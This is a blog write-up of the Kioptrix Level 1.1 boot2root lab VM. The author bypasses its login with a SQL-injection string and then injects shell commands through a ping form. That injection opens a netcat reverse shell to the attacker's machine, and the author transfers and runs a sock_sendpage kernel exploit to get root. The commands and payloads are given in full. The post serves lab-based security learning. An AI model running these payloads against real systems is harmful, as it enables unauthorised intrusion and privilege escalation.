---
layout: post
title: "Kioptrix hacking challenge: Part 2"
date: 2012-07-06 18:10:26 -0400
comments: true
categories: boot2root
alias: /2012/07/kioptrix-hacking-challenge-part-2.html
---

The second Kioptrix challenge isn't quite as scan and exploit as the first, but still a relatively easy beginner challenge. The Kioptrix challenges can be downloaded from [http://www.kioptrix.com/blog/?page_id=135](http://www.kioptrix.com/blog/?page_id=135). It's actually labeled as Level 1.1. The author mentions that there are multiple ways to compromise the system. I've only explored one method, which is what I'll be describing here.

<!--more-->

Once Kioptrix 1.1 had loaded, I ran a netdiscover scan and found it's IP address on my LAN: 192.168.1.146. I followed up with a port scan:

```
# nmap -sV -A -T4 192.168.1.146
 
Starting Nmap 5.61TEST4 ( http://nmap.org ) at 2012-04-24 10:40 EDT
Nmap scan report for 192.168.1.146
Host is up (0.00047s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE              VERSION
22/tcp   open  ssh                  OpenSSH 3.9p1 (protocol 1.99)
|_sshv1: Server supports SSHv1
| ssh-hostkey: 1024 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 (RSA1)
| 1024 34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 (DSA)
|_1024 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 (RSA)
80/tcp   open  http                 Apache httpd 2.0.52 ((CentOS))
|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
111/tcp  open  rpcbind (rpcbind V2) 2 (rpc #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2            111/tcp  rpcbind
|   100000  2            111/udp  rpcbind
|   100024  1            651/udp  status
|_  100024  1            654/tcp  status
443/tcp  open  ssl/http             Apache httpd 2.0.52 ((CentOS))
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2009-10-08 00:10:47
|_Not valid after:  2010-10-08 00:10:47
|_sslv2: server still supports SSLv2
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
631/tcp  open  ipp                  CUPS 1.1
| http-methods: Potentially risky methods: PUT
|_See http://nmap.org/nsedoc/scripts/http-methods.html
3306/tcp open  mysql                MySQL (unauthorized)
MAC Address: 00:0C:29:BF:D3:86 (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:kernel:2.6
OS details: Linux 2.6.9 - 2.6.30
Network Distance: 1 hop
```

A website is available, and it looks like a MySQL database runs in the backend. nmap also found an open CUPS port. I decided to start with the webserver. Browsing over to http://192.168.1.146, I was greeted with a login form.

->![](/images/2012-07-06/01.png)<-

I decided to see if I could bypass the authentication mechanism using a simple SQL injection attack. For the username I entered test, and for the password I entered x' or 'x'='x. I was going by the assumption that the backend SQL code looked something like

```sql
SELECT * FROM ACCOUNTS WHERE USERNAME='test' AND PASSWORD='password'
```

By using x' or 'x'='x the query would be changed so that the results would always be true:

```sql
SELECT * FROM ACCOUNTS WHERE USERNAME='test' AND PASSWORD='x' OR 'x'='x'
```

I hit the Login button and was presented with a new form. The SQL injection worked and I was able to login as some authenticated user.

->![](/images/2012-07-06/02.png)<-

It looked to be some sort of diagnostic tool that allowed an authenticated user to ping a machine. I punched in 127.0.0.1 and hit Submit to see what would happen. A new browser tab opened up that showed the ping results:

->![](/images/2012-07-06/03.png)<-

I wondered if this form was susceptible to code injection. I assumed that the backend code for this form probably just made a system call to ping and passed it the IP address that I had entered in the form. If that was the case, I could chain my own commands at the end of the IP address and have them execute on the server. I started off with 127.0.0.1;id as a simple test:

->![](/images/2012-07-06/04.png)<-

Sure enough, right at the end of the ping results, it showed me that the process had run as the apache user. If I could inject code that would run on the webserver, then I could make it give me a reverse shell so that I could have shell access to the server. Probing the system further, I used the whereis command and found netcat. It was time to try a reverse shell. On my terminal I started a netcat listener

```text
# nc -lvp 8080
```

On the webpage I entered the following into the form and hit Submit

```
127.0.0.1;/usr/local/bin/nc 192.168.1.172 8080 -e '/bin/bash'
```

Netcat on the server started up and connected to my netcat listener and gave me a reverse shell.

->![](/images/2012-07-06/05.png)<-

Now that I had shell access to the system, exploring it would be much easier. Running uname gave me the kernel version, 2.6.9. Checking against exploit-db, I found several exploits against the 2.6.x kernel:

```
# /pentest/exploits/exploitdb/searchsploit kernel 2.6 linux local|sort -n
--------------------------------------------------------------------------- -------------------------
 Description                                                                 Path
Linux 2.6.30+/SELinux/RHEL5 Test Kernel Local Root Exploit 0day             /linux/local/9191.txt
Linux Kernel 2.4.1-2.4.37 and 2.6.1-2.6.32-rc5  Pipe.c Privelege Escalation /linux/local/9844.py
Linux Kernel 2.4/2.6 bluez Local Root Privilege Escalation Exploit (update) /linux/local/926.c
Linux Kernel 2.4/2.6 sock_sendpage() Local Root Exploit [2]                 /linux/local/9598.txt
Linux Kernel 2.4/2.6 sock_sendpage() Local Root Exploit [3]                 /linux/local/9641.txt
Linux Kernel 2.4/2.6 sock_sendpage() Local Root Exploit (ppc)               /linux/local/9545.c
Linux Kernel 2.4/2.6 sock_sendpage() ring0 Root Exploit (simple ver)        /linux/local/9479.c
Linux Kernel 2.4/2.6 x86-64 System Call Emulation Exploit                   /linux/local/4460.c
```

The ring0 root exploit seemed promising, so I decided to try that one first. Using netcat, I transferred the file from my machine to the target: On my machine:

```
nc -lvp 9998 < /pentest/exploits/exploitdb/linux/local/9479.c
```

On the target machine:

```
cd /tmp/
nc 192.168.1.172 9998 > 9479.c
```

With the ring0 exploit transferred, it was time to compile and run it:

```
gcc 9479.c
./a.out
sh: no job control in this shell
sh-3.00# id
uid=0(root) gid=0(root) groups=48(apache)
sh-3.00#
```

Instant root shell and game over.
This challenge was a just a little bit more involved than the first Kioptrix level. Getting a foothold into the system required a bit of knowledge about SQL injection, and how Linux commands can be chained. If you can find a way to run commands on the server remotely, you're one step closer to rooting it.
